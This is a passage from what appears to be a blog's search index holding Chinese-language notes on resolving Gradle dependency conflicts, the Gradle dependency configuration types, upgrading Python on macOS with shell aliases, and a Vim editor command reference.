class="language-gradle">configurations.all {   transitive = false}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="强制依赖"><a href="#强制依赖" class="headerlink" title="强制依赖"></a>强制依赖</h3><p>对冲突的jar强行制定一个版本</p><pre class="line-numbers language-gradle"><code class="language-gradle">gradleconfigurations.all {    resolutionStrategy.force "com.amazonaws:aws-java-sdk-bom:1.11.698"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> gradle </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gradle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gradle依赖(dependencies)类型</title>
      <link href="/2020/07/20/gradle-dependencied/"/>
      <url>/2020/07/20/gradle-dependencied/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>dependencies用来配置当项目的依赖项。我们常常在gradle配置文件中看到api,implementation,compile……。</p><pre class="line-numbers language-gradle"><code class="language-gradle">dependencies {    testImplementation "org.springframework.boot:spring-boot-starter-test"    compileOnly "org.springframework.boot:spring-boot-configuration-processor"    compile group: 'com.github.xiaoymin', name: 'knife4j-spring-ui', version: '2.0.1'    implementation 'org.springframework.cloud:spring-cloud-starter-config'    api 'com.squareup.okhttp3:okhttp:3.14.7'}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="dependencies类型"><a href="#dependencies类型" class="headerlink" title="dependencies类型"></a>dependencies类型</h2><p>ependencies的类型可以分为以下几种</p><ul><li><p>compile</p><ol><li>testCompile</li><li>debugCompile</li><li>releaseCompile</li><li>compileOnly</li></ol></li><li><p>implementation</p><ol><li>testImplementation</li><li>debugImplementation</li><li>releaseImplementation    </li></ol></li><li><p>provided</p></li><li><p>api</p></li></ul><h3 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h3><p>从依赖上讲，用compile修饰的配置会传递依赖，而大多数的依赖冲突都是由compile产生的，什么是传递依赖？<br>打个比方：我们现在有libA，然后libB用compile依赖libA，最后libC依赖libB。那这个时候，libC自然能够使用libA的内容，因为libA的内容跟随这个libB而传递到了libC中。<br><img src="0CA30198-6E91-4D8E-A268-5637657A34B2.png" alt><br>而且compile得越多，所产生的依赖树也就越长，也就越难控制。</p><p>从编译上讲，使用compile配置的依赖项，会跟随打包流程将源码打包到jar中。</p><p>这两个依赖项配置和compile是差不多的，也会产生传递依赖，唯一不同的是，testcompile和<br>Testcompile不会参与源码打包，只会参与测试包的打包，并且只有在测试模式下启动才会生效，debug和release包不生效。</p><p>debugCompile和releaseCompile</p><p>debugCompile<br>只在buildType为debug的时候参与打包，release不参与打包，比方说我们的内存泄露检测工具-LeakCanary，其实我们也只是需要在debug模式下打包调试，而发布release版本就需要进行打包了，所以用debugCompile来进行配置<br>releaseCompile<br>releaseCompile和debugCompile完全相反，只在release模式下参与打包，应用场景不是很多。</p><h3 id="implementation"><a href="#implementation" class="headerlink" title="implementation"></a>implementation</h3><p>implementation 是Gradle4.1新增的依赖方式，implementation和compile不同，该依赖方式不会产生传递依赖，implementation有点像provided和、debugCompile和releaseCompile的集合体。<br>来个具体场景，例如：有libA公共库，libB通过implementation依赖libB，然后app无论通过什么方式依赖libB，lib1的依赖都不会传递过来，必须要在app中重新依赖一次。如下图：<br><img src="3B26A415-589E-4EE9-95E6-EAD19543E16B.png" alt><br>使用implementation有什么好处呢？</p><p>很大程度减少重复依赖的问题<br>在开源 lib 的时候尽量采用implementation的方式依赖一些v4、v7包</p><h3 id="provided"><a href="#provided" class="headerlink" title="provided"></a>provided</h3><p>只参与编译，不参与打包。例如说有libB依赖了libA，moduleC又同时依赖了libA和libB，那么libB就可以使用provided来依赖libA。</p><h3 id="api"><a href="#api" class="headerlink" title="api"></a>api</h3><p>api是Gradle4.1新增的依赖方式,其作用于compile基本一致。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> 对于使用Gradle plugin 3.X以上版本的gradle，我们应该转而使用implementation，减少compile的使用，避免依赖冲突的产生。如果我们有开放的lib，那么更加应该使用implementation导入依赖，尽量少给lib的使用者造成困扰。</p>]]></content>
      
      
      <categories>
          
          <category> gradle </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gradle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>macos Python 版本问题</title>
      <link href="/2020/07/20/python-macos/"/>
      <url>/2020/07/20/python-macos/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>macos系统自带的python2.7，但是2020年python2.7已经不再维护，因此我们需要升级到3.0以上。</p><h1 id="查看已安装python版本"><a href="#查看已安装python版本" class="headerlink" title="查看已安装python版本"></a>查看已安装python版本</h1><p><code>python -V</code></p><h1 id="安装路径"><a href="#安装路径" class="headerlink" title="安装路径"></a>安装路径</h1><p>不同方式安装有不同的安装路径：<br>系统默认<br><code>/System/Library/Frameworks/Python.framework/Versions/2.7</code></p><p>brew 安装<br><code>/usr/local/Cellar/python</code></p><p>官网pkg安装   <code>/Library/Frameworks/Python.framework/Versions/3.7</code></p><h1 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h1><p>升级python主要有两种方法</p><h2 id="使用Mac自带的包管理工具brew"><a href="#使用Mac自带的包管理工具brew" class="headerlink" title="使用Mac自带的包管理工具brew"></a>使用Mac自带的包管理工具brew</h2><p><code>brew upgrade python</code></p><h2 id="下载安装包升级"><a href="#下载安装包升级" class="headerlink" title="下载安装包升级"></a>下载安装包升级</h2><p>python官网下载 地址：<a href="https://www.python.org/downloads/" target="_blank" rel="noopener">https://www.python.org/downloads/</a></p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>使用软链接，把终端中的python和pip，指定为我们下载后的python3和pip3。这可以通过修改环境来实现<br>打开环境变量：根据自己的安装方式，找到安装目录，添加进环境。</p><pre class="line-numbers language-shell"><code class="language-shell">open ~/.bash.profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-vim"><code class="language-vim">alias python3<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>Cellar<span class="token operator">/</span><span class="token keyword">python</span>@<span class="token number">3.8</span><span class="token operator">/</span><span class="token number">3.8</span><span class="token operator">.</span><span class="token number">2</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>python3<span class="token operator">.</span><span class="token number">8</span>alias python2<span class="token operator">=</span><span class="token operator">/</span>System<span class="token operator">/</span>Library<span class="token operator">/</span>Frameworks<span class="token operator">/</span>Python<span class="token operator">.</span>framework<span class="token operator">/</span>Versions<span class="token operator">/</span><span class="token number">2.7</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>python2<span class="token operator">.</span><span class="token number">7</span>alias <span class="token keyword">python</span><span class="token operator">=</span>python3alias pip<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>Cellar<span class="token operator">/</span><span class="token keyword">python</span>@<span class="token number">3.8</span><span class="token operator">/</span><span class="token number">3.8</span><span class="token operator">.</span><span class="token number">2</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>pip3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-shell"><code class="language-shell">source ~/.bash_profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> macos </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> macos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VIM编辑器</title>
      <link href="/2020/02/16/vim/"/>
      <url>/2020/02/16/vim/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>vi是一个命令行界面下的文本编辑工具，最早在1976年由bill joy开发，当时名字叫做ex,vi支持大多数操作系统（最早在BSD上发布），并且功能已经十分强大。1991年bram基于vi进行了改进，发布了vim,加入了GUI的支持。<br>当前vim已经不仅仅是普通意义上的文本编辑器（如window上的记事本），而是被广泛的作为在文本编辑，文本处理，代码开发等用途。<br>Linux中知名的文本编辑器还有emacs,它的功能比vim还要强大。<br>绝大数Linux系统上均安装vim，vim比vi的功能更为强大。<br>vim命令可以启动vim编辑器<br>一般我们使用vim+目标文件路径的形式使用vim<br>如果目标文件存在，则vim打开文件，如果目标文件不存在，则vim新建并打开该文件</p><h2 id="四种模式"><a href="#四种模式" class="headerlink" title="四种模式"></a>四种模式</h2><h3 id="normal模式"><a href="#normal模式" class="headerlink" title="normal模式"></a>normal模式</h3><p>vim启动后，默认进入normal模式，任何模式都可以通过esc键回到normal模式（可以按几次）。normal模式下可以通过键入不同的命令完成选择，复制，粘贴，撤销等等操作。</p><p><strong>进入插入模式：</strong><br> i（insert）: 在光标前插入文本<br>o (open a line below): 在当前行的下面插入新行<br>a (append):追加，在当前光标后插入<br>A：在行最后位置插入<br>I：  在行最前的位置插入<br>O：在当前编辑位置的上面新起一行</p><p><strong>移动：</strong><br>h:左<br>j:下<br>k:上<br>l:右</p><p><strong>在单词之间移动：</strong><br>w/W 移到下一个word/WORD开头，<br>e/E 下一个word/WORD结尾<br>b/B 回到上一个word/WORD开头 backword<br>word指的是以非空白符分割的单词，WORD指的是以空白符分割的单词。</p><p><strong>行间搜索移动：</strong><br>同一行快速移动的方式其实是搜索一个字符并且移动到该字符<br>使用f{char}可以移动到char字符上，t移动到char的前一个字符<br>如果第一次没有搜到，可以用分号；/逗号，继续搜该行下一个/上一个。<br>大写的F表示反过来搜前面的字符</p><p><strong>vim 水平移动：</strong><br>0移动到行首第一个字符<br>^移动到第一个非空白字符<br>$移动到行尾<br>g_移动到行尾非空白字符</p><p><strong>vim垂直移动：</strong><br>在句子sentence和段落paragraph间移动<br>使用括号（）在句子间移动<br>使用{}在段落之间移动<br>使用easy-montion插件移动。</p><p><strong>vim 页面移动：</strong><br>gg/G移动到文件开头和结尾<br>ctrl+o快速返回。<br>H/M/L 跳转到屏幕的开头head,中间middle，结尾lower<br>ctrl+u ctrl+f上下翻页，upword/forword<br>zz把屏幕置为中间。</p><p><strong>删除：</strong><br>    x:删除当前光标所在的一个字符<br>    .:再次删除一个字符<br>    N<command>:<br>        10x：删除10个连续字符<br>        3dd：删除三行文本<br>    dw:删除一个单词，dnw，n换为数字，删除n个单词</p><p><strong>行间跳转：</strong><br>                nG(c shift+g)： 游标移动到第几行<br>                gg：游标移动第一行<br>                G(shift+g) ：游标移动到最后一行<br>                ctrl+o : 快速回到上一次光标所在位置<br>                ~:将游标所在字母变成大写</p><p><strong>复制和粘贴：</strong><br>             yy将当前行的内容放入缓冲区（复制游标所在的整行，3yy表示复制3行）<br>                y^ 复制至行首，或y0。不含光标所在处字符。<br>                y$ 复制至行尾。含光标所在处字符。<br>                yw 复制一个单词。<br>                y2w 复制两个单词。<br>                yG 复制至文本末。<br>                y1G 复制至文本开头。<br>                p将缓冲区中的文本放入光标后（粘贴）<br>                p(小写)代表粘贴至光标后（下）<br>                P(大写)代表粘贴至光标前（上）<br>        dd:剪切<br>        p:粘贴<br>        ddp:交换上下行位置</p><p><strong>查找和替换(undo命令)：</strong></p><p>r+&lt;代替换字母&gt;：将游标所在字母替换为指定字母<br>R    连续替换，直到按下Esc<br>cc    替换整行，即删除游标所在行，并进入插入模式<br>cw    替换一个单词，即删除一个单词，并进入插入模式<br>C(大写)    替换游标以后至行末<br>~    反转游标所在字母大小写</p><p><strong>撤销：</strong><br>u{n}    撤销一次或n次操作<br>U(大写)    撤销当前行的所有修改<br>Ctrl+r    redo，即撤销undo的操作</p><p><strong>快速缩进：</strong><br>        &gt;&gt; 整行将向右缩进<br>        &lt;&lt; 整行向左回退<br>        :set shiftwidth?  获取目前设定值<br>        :set shiftwidth=10 设置缩进为10个字符<br>命令行模式下输入<br>                                :ri(right)命令使本行文本靠右<br>                                :ce(center)命令使本行内容居中<br>                                le(left)命令使本行内容靠左</p><p><strong>快速查找：</strong><br>        / string  然后回车查找字符串string<br>        n  查找下一个string<br>        ? tcp 向上查找字符串tcp<br>        N 查找上一个出现的tcp<br>        命令模式下输入 noh 回车取消搜索</p><pre><code>    普通模式下输入\*寻找游标所在处的单词    普通模式下输入\#同上，但 \# 是向前（上）找，\*则是向后（下）找    普通模式下输入g\*同\* ，但部分符合该单词即可    普通模式下输入g\#同\# ，但部分符合该单词即可</code></pre><h3 id="insert模式"><a href="#insert模式" class="headerlink" title="insert模式"></a>insert模式</h3><pre><code> 命令模式 按i 即可进入插入模式，在插入模式中可以输入编辑文本内容，按esc键可以返回命令模式</code></pre><p><strong>如何快速纠错</strong>：<br> ctrl+h 删除上一个字符<br> ctrl+w 删除上一个单词<br> ctrl+u 删除当前行</p><p><strong>快速切换normal和insert</strong><br>esc,ctrl+c,ctrl+[<br>gi快速跳转到你最后一次编辑的地方并进入插入模式。<br>如何映射方便的快捷键来替代esc</p><h3 id="command模式"><a href="#command模式" class="headerlink" title="command模式"></a>command模式</h3><pre><code> 在normal模式中按“：”进入command模式，光标会移动到底部，在这里可以保存，修改或退出vim    :w  write保存当前修改    :q  quit退出    :wq write quit 保存退出    :q!  quit!强制退出    :x 保存并退出    :set nu    显示行号    :! 系统命令 执行一个系统命令并显示结果    :sh  切换到命令行，使用ctrl+d切换回vim    :vs(vertical split),sp(split) 分屏 :% s/java/python/g 全局替换 java替换为python</code></pre><h3 id="visual-可视-模式"><a href="#visual-可视-模式" class="headerlink" title="visual(可视)模式"></a>visual(可视)模式</h3><p>visua模式一般用来块状选择文本，normal模式下使用v进入visual选择。使用V选择行。使用ctrl+v进行块状选择。</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
